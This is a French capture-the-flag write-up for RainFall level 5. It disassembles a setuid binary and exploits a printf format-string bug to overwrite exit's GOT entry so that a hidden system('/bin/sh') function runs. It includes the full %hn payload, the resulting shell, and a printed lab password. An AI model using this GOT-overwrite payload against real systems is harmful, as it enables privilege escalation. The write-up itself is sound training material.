# 05 - Format string 3

- On se connecte en tant que level5:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
```

```
level5@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
level5@RainFall:~$ gdb level5
```

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:     push   %ebp
   0x08048505 <+1>:     mov    %esp,%ebp
   0x08048507 <+3>:     and    $0xfffffff0,%esp
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>:    leave
   0x08048510 <+12>:    ret
End of assembler dump.
```

```
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
```


- Voyons les parties les plus importantes du programme:
```
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
```
>Prompt stdin pour 512 octets dans une zone mémoire de 520 octets.

```
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
```
>Appelle `printf()` avec notre buffer.


```
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
```
>Se termine en `exit(1)`.


- `<printf@plt>` nous permet d'écrire n'importe quoi n'importe ou dans la mémoire. Ici, nous allons réécrire l'adresse du `jmp` fait par `call 0x80483d0 <exit@plt>` pour qu'il pointe vers une autre fonction.
```
(gdb) x 0x80483d0
   0x80483d0 <exit@plt>:        jmp    *0x8049838
(gdb) x/x 0x8049838
0x8049838 <exit@got.plt>:       0x080483d6
(gdb) x/2i 0x080483d6
   0x80483d6 <exit@plt+6>:      push   $0x28
   0x80483db <exit@plt+11>:     jmp    0x8048370
```

```
All defined functions:

Non-debugging symbols:
...
0x080484a4  o
0x080484c2  n
0x08048504  main
...
```

```
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
```
>`0x80485f0: "/bin/sh"`


- Tiens! Une fonction qui n'est appelée nulle part mais qui fait `system("/bin/sh")`!

- En mettant la valeur `080484a4` dans `0x8049838`, l'exécution du programme devrait être redirigée vers cette fonction.
>Low order bytes = 84a4 (33 956 in decimal)

>High order bytes = 0804 (2052 in decimal)

>`\x40\x98\04\x08\x38\x98\x04\x08 %VALUE1x %4$hn %VALUE2x %5$hn`

>`VALUE1 (0x8049840)` ==> 2052 - 8 bytes for the addresses - 2 bytes for the spaces = **2042**

>`VALUE2 (0x8049838)` ==> 33 956 - 2052 - 2 bytes for the spaces = **31 902**

```
level5@RainFall:~$ (echo -ne '\x40\x98\04\x08\x38\x98\x04\x08 %2042x %4$hn %31902x %5$hn'; cat) | ./level5
...
whoami
level6

cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
